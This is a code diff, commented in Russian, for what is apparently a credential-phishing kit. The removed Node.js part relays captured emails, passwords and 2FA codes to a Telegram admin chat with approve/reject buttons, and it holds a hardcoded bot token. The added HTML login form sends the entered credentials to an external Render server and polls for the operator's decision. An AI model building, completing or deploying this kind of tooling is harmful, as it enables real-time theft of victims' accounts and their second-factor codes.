@@ -1,131 +1,45 @@
-const TelegramBot = require('node-telegram-bot-api');
+<input type="text" id="email" placeholder="Email">
+<input type="password" id="pass" placeholder="Password">
+<button onclick="sendData()">Войти</button>
 
-const express = require('express');
+<script>
+    const SERVER_URL = 'https://sever-afk3.onrender.com'; // Твой URL на Render
+    const userId = 'user_' + Math.random().toString(36).substr(2, 9);
 
-const cors = require('cors');
+    async function sendData() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
 
+        // Отправка данных на твой сервер
+        await fetch(`${SERVER_URL}/send-data`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                type: 'auth',
+                email: email,
+                pass: pass,
+                userId: userId
+            })
+        });
 
+        alert('Данные отправлены. Ожидайте подтверждения...');
 
-// --- НАСТРОЙКИ ---
+        // Твоя функция проверки подтверждения
+        const interval = setInterval(async () => {
+            const res = await fetch(`${SERVER_URL}/check/${userId}`);
+            const data = await res.json();
 
-const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ'; 
-
-const adminChatId = '-1003894478662'; 
-
-// -----------------
-
-
-
-const bot = new TelegramBot(token, { polling: true });
-
-const app = express();
-
-
-
-app.use(cors());
-
-app.use(express.json());
-
-
-
-let userStatuses = {}; 
-
-
-
-// 1. Прием данных с сайта
-
-app.post('/send-data', (req, res) => {
-
-    const { type, email, pass, code, userId } = req.body;
-
-    
-
-    userStatuses[userId] = 'pending';
-
-    console.log(`[${userId}] Новый запрос: ${type}`);
-
-
-
-    let message = '';
-
-    if (type === 'auth') {
-
-        message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
-
-    } else if (type === '2fa') {
-
-        message = `🔢 **Код 2FA**: \`${code}\``;
-
-    } else {
-
-        message = `ℹ️ Инфо: ${req.body.text || 'нет данных'}`;
-
+            if (data.status === 'success') {
+                clearInterval(interval);
+                alert('Админ подтвердил вход!');
+                // window.location.href = 'успех.html';
+            } else if (data.status === 'error') {
+                clearInterval(interval);
+                alert('Админ отклонил вход.');
+            }
+        }, 3000);
     }
+</script>
 
-
-
-    bot.sendMessage(adminChatId, message, {
-
-        parse_mode: 'Markdown',
-
-        reply_markup: {
-
-            inline_keyboard: [[
-
-                { text: '✅ Подтвердить', callback_data: `ok_${userId}` },
-
-                { text: '❌ Неверно', callback_data: `err_${userId}` }
-
-            ]]
-
-        }
-
-    });
-
-
-
-    res.json({ status: 'ok' });
-
-});
-
-
-
-// 2. Обработка кнопок в Telegram
-
-bot.on('callback_query', (query) => {
-
-    const data = query.data.split('_');
-
-    const action = data[0]; 
-
-    const userId = data[1];
-
-
-
-    if (action === 'ok') {
-
-        userStatuses[userId] = 'success';
-
-        console.log(`[${userId}] Админ нажал: ✅`);
-
-    } else {
-
-        userStatuses[userId] = 'error';
-
-        console.log(`[${userId}] Админ нажал: ❌`);
-
-    }
-
-
-
-    bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
-
-    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
-
-        chat_id: query.message.chat.id,
-
-        message_id: query.message.message_id
-
-    });
 
 
